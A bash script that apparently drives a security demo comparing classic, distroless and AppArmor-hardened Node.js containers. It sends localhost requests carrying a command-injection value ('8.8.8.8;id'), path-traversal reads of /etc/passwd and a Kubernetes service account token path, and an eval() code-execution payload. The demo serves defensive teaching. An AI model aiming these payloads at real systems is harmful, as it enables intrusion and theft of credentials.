#!/bin/bash
# Run the demo attacks against one of the Node.js containers.
#
# Color legend (from the DEFENDER's point of view):
#   RED   = attack SUCCEEDED  (HTTP 2xx/3xx) -> bad
#   GREEN = attack BLOCKED    (HTTP >= 400)  -> good
# The color is derived from the container's actual HTTP response, so the same
# attack turns red on app-classic and green on app-distroless automatically.

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

usage() {
  cat <<EOF
Usage: $0 <target> [attack names...]

  <target> can be the SERVICE NAME or the PORT:
    app-classic              -> 6661   (classic Node image: has /bin/sh)
    app-distroless           -> 6662   (distroless: no shell)
    app-distroless-hardened  -> 6663   (distroless + AppArmor)

  [attack names] (optional) selects which attacks to run (default: all):
    cmdi     Command Injection
    passwd   Path Traversal -> /etc/passwd
    token    Path Traversal -> Kubernetes service account token
    conf     Path Traversal -> planted /etc/come-to-code.conf (AppArmor blacklist gap)
    supertoken  Path Traversal -> come-to-code-supersecure-token (easter egg, ASCII art)
    eval     Arbitrary Code Execution via eval()

  Examples:
    $0 app-distroless
    $0 app-distroless-hardened passwd token   # the "AppArmor victory" beat
    $0 app-distroless-hardened conf           # the blacklist-gap twist
    $0 app-distroless-hardened eval           # the wrong-layer twist
EOF
  exit 1
}

[ $# -eq 0 ] && usage

case "$1" in
  app-classic)             PORT=6661 ;;
  app-distroless)          PORT=6662 ;;
  app-distroless-hardened) PORT=6663 ;;
  -h|--help)               usage ;;
  [0-9]*)                  PORT="$1" ;;
  *) echo "Unknown target: '$1'"; echo; usage ;;
esac
TARGET="$1"; shift
SELECTION=("$@")
[ ${#SELECTION[@]} -eq 0 ] && SELECTION=(cmdi passwd token conf eval)

# run <title> <description> <curl args...>
run() {
  local title="$1" desc="$2"; shift 2
  echo -e "\n${BOLD}--- ${title} ---${NC}"
  echo -e "${DIM}${desc}${NC}"
  local tmp code body
  tmp=$(mktemp)
  code=$(curl -s -o "$tmp" -w '%{http_code}' "$@")
  body=$(head -n 8 "$tmp")
  rm -f "$tmp"
  if [ -z "$code" ] || [ "$code" = "000" ]; then
    echo -e "${YELLOW}${BOLD}[NO RESPONSE - is the container up? HTTP ${code}]${NC}"
    echo -e "${DIM}${body}${NC}"
  elif [ "$code" -ge 200 ] && [ "$code" -lt 400 ]; then
    echo -e "${RED}${BOLD}[ATTACK SUCCEEDED - HTTP ${code}]${NC}"
    echo -e "${RED}${body}${NC}"
  else
    echo -e "${GREEN}${BOLD}[ATTACK BLOCKED - HTTP ${code}]${NC}"
    echo -e "${GREEN}${body}${NC}"
  fi
}

attack_cmdi() {
  # curl equivalent:
  #   curl -G "http://localhost:${PORT}/attack/command-injection" --data-urlencode "ip=8.8.8.8;id"
  #   (already-encoded: curl "http://localhost:${PORT}/attack/command-injection?ip=8.8.8.8%3Bid")
  run "Command Injection  [cmdi]  (/attack/command-injection)" \
      "Injects a shell command into an unsanitized exec() call." \
      -G "http://localhost:${PORT}/attack/command-injection" --data-urlencode "ip=8.8.8.8;id"
}
attack_passwd() {
  # curl equivalent:
  #   curl "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../etc/passwd"
  run "Path Traversal -> /etc/passwd  [passwd]  (/attack/path-traversal)" \
      "Reads an arbitrary file through an unvalidated file path." \
      "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../etc/passwd"
}
attack_token() {
  # curl equivalent:
  #   curl "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token"
  run "Path Traversal -> Kubernetes token  [token]  (fake, mounted for the demo)" \
      "Same LFI, aimed at the service account token path." \
      "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token"
}
attack_supertoken() {
  # curl equivalent:
  #   curl "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../var/run/secrets/come-to-code-supersecure-token"
  # NOTE: mounted OUTSIDE the AppArmor-denied glob (/var/run/secrets/kubernetes.io/serviceaccount/**),
  #       so it stays readable even on app-distroless-hardened -> the "supersecure" name was the only control.
  run "Path Traversal -> come-to-code-supersecure-token  [supertoken]  (easter egg)" \
      "Same LFI on a file named 'supersecure' that holds ASCII art, not a secret." \
      "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../var/run/secrets/come-to-code-supersecure-token"
}
attack_conf() {
  # curl equivalent:
  #   curl "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../etc/come-to-code.conf"
  run "Path Traversal -> /etc/come-to-code.conf  [conf]" \
      "Same LFI on a harmless file the AppArmor blacklist forgot to deny." \
      "http://localhost:${PORT}/attack/path-traversal?file=../../../../../../etc/come-to-code.conf"
}
attack_eval() {
  # curl equivalent:
  #   curl -G "http://localhost:${PORT}/attack/eval-rce" --data-urlencode "code=1+1"
  #   (already-encoded: curl "http://localhost:${PORT}/attack/eval-rce?code=1%2B1")
  run "Arbitrary Code Execution  [eval]  (/attack/eval-rce)" \
      "Executes arbitrary JavaScript through eval() (no shell required)." \
      -G "http://localhost:${PORT}/attack/eval-rce" --data-urlencode "code=1+1"
}

echo -e "${BOLD}=== Attacks against '${TARGET}' (port ${PORT}) ===${NC}"
echo -e "Legend: ${RED}${BOLD}RED = attack succeeded${NC} | ${GREEN}${BOLD}GREEN = attack blocked${NC}"

for name in "${SELECTION[@]}"; do
  case "$name" in
    cmdi)   attack_cmdi ;;
    passwd) attack_passwd ;;
    token)  attack_token ;;
    conf)   attack_conf ;;
    supertoken) attack_supertoken ;;
    eval)   attack_eval ;;
    *) echo -e "\n${YELLOW}Skipping unknown attack '$name' (valid: cmdi passwd token conf supertoken eval)${NC}" ;;
  esac
done

echo ""
